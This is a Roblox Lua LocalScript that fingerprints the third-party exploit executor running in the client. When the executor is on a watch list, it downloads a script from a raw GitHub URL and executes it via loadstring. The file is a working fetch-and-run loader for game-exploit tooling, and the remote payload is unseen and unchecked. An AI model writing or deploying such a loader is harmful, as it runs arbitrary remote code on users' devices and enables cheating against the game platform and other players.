-- Auto-loader based on executor name
-- Place in StarterPlayerScripts or StarterGui (LocalScript)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- config
local WATCH_LIST = {
    "jjspoilt",
    "xeno",
    "solara",
    "velocity"
}
local TARGET_URL = "https://raw.githubusercontent.com/Luongdaynetroi/Testscript/refs/heads/main/kobyayd"
local RUNTIME_FLAG = "_AUTOLOAD_EXECUTOR_FLAG_v1"

-- helper lowercase
local function lower(s) return (tostring(s) or ""):lower() end

-- Best-effort detect executor/client name
local function detect_executor_name()
    -- try identifyexecutor()
    if type(identifyexecutor) == "function" then
        local ok, name = pcall(identifyexecutor)
        if ok and name and tostring(name) ~= "" then return lower(name) end
    end

    -- try getexecutor()
    if type(getexecutor) == "function" then
        local ok, name = pcall(getexecutor)
        if ok and name and tostring(name) ~= "" then return lower(name) end
    end

    -- try known globals / tables
    if syn and type(syn) == "table" then
        if syn.protect_gui or syn.request then return "synapse" end
    end
    if type(is_sirhurt_closure) == "boolean" then return "sirhurt" end
    if type(KRNL_LOADED) ~= "nil" then return "krnl" end
    if fluxus and type(fluxus.request) == "function" then return "fluxus" end

    -- try heuristics: check global keys possibly set by custom clients
    local globals_to_check = {"jjspoilt","xeno","solara","velocity","JJSPOILT","XENO","SOLARA","VELOCITY"}
    for _,g in ipairs(globals_to_check) do
        if rawget(_G, g) ~= nil then
            return lower(g)
        end
        if _G[g] ~= nil then
            return lower(g)
        end
    end

    -- fallback: Unknown
    return "unknown"
end

-- Choose an HTTP GET method available in this environment
local function http_get(url)
    -- try syn.request
    if syn and syn.request then
        local ok, res = pcall(function() return syn.request({Url = url, Method = "GET"}) end)
        if ok and res and (res.Body or res.body) then return res.Body or res.body end
    end

    -- try generic request/http_request
    if request then
        local ok, res = pcall(function() return request({Url = url, Method = "GET"}) end)
        if ok and res and (res.Body or res.body) then return res.Body or res.body end
    end
    if http_request then
        local ok, res = pcall(function() return http_request({Url = url, Method = "GET"}) end)
        if ok and res and (res.Body or res.body) then return res.Body or res.body end
    end

    -- try fluxus/http
    if fluxus and fluxus.request then
        local ok, res = pcall(function() return fluxus.request({Url = url, Method = "GET"}) end)
        if ok and res and (res.Body or res.body) then return res.Body or res.body end
    end

    -- try HttpService:GetAsync
    if HttpService and type(HttpService.GetAsync) == "function" then
        local ok, body = pcall(function() return HttpService:GetAsync(url) end)
        if ok and body then return body end
    end

    -- try game:HttpGet
    if game and type(game.HttpGet) == "function" then
        local ok, body = pcall(function() return game:HttpGet(url) end)
        if ok and body then return body end
    end

    return nil, "no-http-method"
end

-- Try to fetch and run the target script safely
local function fetch_and_run(url)
    -- fetch
    local content, err = http_get(url)
    if not content then
        warn("[AutoLoader] failed to fetch URL:", tostring(err))
        return false, "fetch failed"
    end

    -- loadstring check
    if type(loadstring) ~= "function" then
        -- some envs use load instead
        if type(load) == "function" then
            local ok, fn = pcall(function() return load(content) end)
            if not ok or type(fn) ~= "function" then
                warn("[AutoLoader] load failed")
                return false, "load failed"
            end
            local runOk, runErr = pcall(fn)
            if not runOk then
                warn("[AutoLoader] runtime error:", runErr)
                return false, "runtime error"
            end
            return true
        end
        warn("[AutoLoader] no loadstring available")
        return false, "no loadstring"
    end

    local ok, fn_or_err = pcall(function() return loadstring(content) end)
    if not ok or type(fn_or_err) ~= "function" then
        warn("[AutoLoader] loadstring error:", tostring(fn_or_err))
        return false, "loadstring error"
    end

    local runOk, runErr = pcall(fn_or_err)
    if not runOk then
        warn("[AutoLoader] running fetched script failed:", tostring(runErr))
        return false, "runtime error"
    end

    return true
end

-- Main logic: detect -> if match in list -> run once
task.spawn(function()
    -- small delay to let environment populate
    task.wait(0.35)

    -- avoid double-run
    if rawget(_G, RUNTIME_FLAG) then
        -- already executed previously in this session
        return
    end

    local name = detect_executor_name()
    print("[AutoLoader] detected executor:", name)

    -- check if name matches any in WATCH_LIST
    local match = false
    for _,v in ipairs(WATCH_LIST) do
        if lower(v) == lower(name) then
            match = true
            break
        end
    end

    -- Also if unknown but some of those globals exist, try to detect again
    if not match and name == "unknown" then
        for _,v in ipairs(WATCH_LIST) do
            if rawget(_G, v) ~= nil or _G[v] ~= nil then
                match = true
                name = lower(v)
                break
            end
        end
    end

    if match then
        print(("[AutoLoader] executor '%s' matched watchlist — attempting to load %s"):format(tostring(name), TARGET_URL))
        local ok, err = pcall(function()
            local sOk, sRes = fetch_and_run(TARGET_URL)
            if not sOk then
                warn("[AutoLoader] fetch_and_run failed:", sRes or "err")
            else
                print("[AutoLoader] fetched & executed successfully.")
            end
        end)
        if not ok then warn("[AutoLoader] unexpected error:", tostring(err)) end

        -- mark as run to prevent repeats
        rawset(_G, RUNTIME_FLAG, true)
    else
        print("[AutoLoader] executor not in watchlist; skipping.")
    end
end)
